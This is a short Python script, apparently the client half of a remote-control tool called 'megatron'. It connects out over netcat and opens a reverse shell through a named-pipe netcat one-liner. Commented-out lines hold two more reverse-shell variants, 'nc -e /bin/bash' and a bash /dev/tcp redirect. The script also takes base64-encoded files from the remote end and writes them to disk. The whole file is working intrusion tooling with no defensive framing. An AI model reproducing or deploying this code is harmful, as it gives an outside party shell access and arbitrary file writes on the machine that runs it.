import subprocess
import sys
import base64
from time import sleep

# TODO use socat binary for terminal
REMOTE_IP = '127.0.0.1'
PORT_MAIN = '7890'
PORT_SHELL = str(int(PORT_MAIN) + 1)
PREFIX = 'sndwv_'  # leave blank if original filename is desired

CMD_EXIT = '-e'
CMD_NEW_FILE = '-c'
CMD_END_FILE = '-t'


def main():
    print('Initialising main coms')
    process_main = subprocess.Popen(['nc', REMOTE_IP, PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)   
    sleep(1)    
    print('Initialising remote shell')
    # process_shell = subprocess.Popen(['nc', '-e', '/bin/bash', REMOTE_IP, PORT_SHELL], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    process_shell = subprocess.Popen('rm /tmp/backpipe; mknod /tmp/backpipe p; /bin/bash 0</tmp/backpipe | nc ' + REMOTE_IP + ' ' + PORT_SHELL + ' 1>/tmp/backpipe', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    # process_shell = subprocess.Popen('bash -i >& /dev/tcp/' + REMOTE_IP + '/' + PORT_SHELL + ' 0>&1', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

    if process_main.poll() is not None:
        raise Exception('Error 102 during main_coms initialisation - is megatron running?')
    if process_shell.poll() is None:
        print('Initialisation Successful')
    else:
        print('Megatron running, but shell appears faulty - reverse shell command is bad?')
    print('-------------------------------------')
    while True:
        command = process_main.stdout.readline().rstrip()
        begin_file_update(command, process_main)


def begin_file_update(command, process_main):
    # print('command = ' + command)
    if command == CMD_NEW_FILE:
        file_name = process_main.stdout.readline().rstrip()
        print('Receiving: ' + file_name + ' .....', end='')
        encoded = process_main.stdout.readline().rstrip()
        contents = base64.b64decode(encoded)
        with open(PREFIX + file_name, 'wb+') as file_handle:
            file_handle.write(contents)
        if process_main.stdout.readline().rstrip() == CMD_END_FILE:
            print(' Received!')
        else:
            raise Exception('Error 103 - End of file not found')


if __name__ == "__main__":
    main()
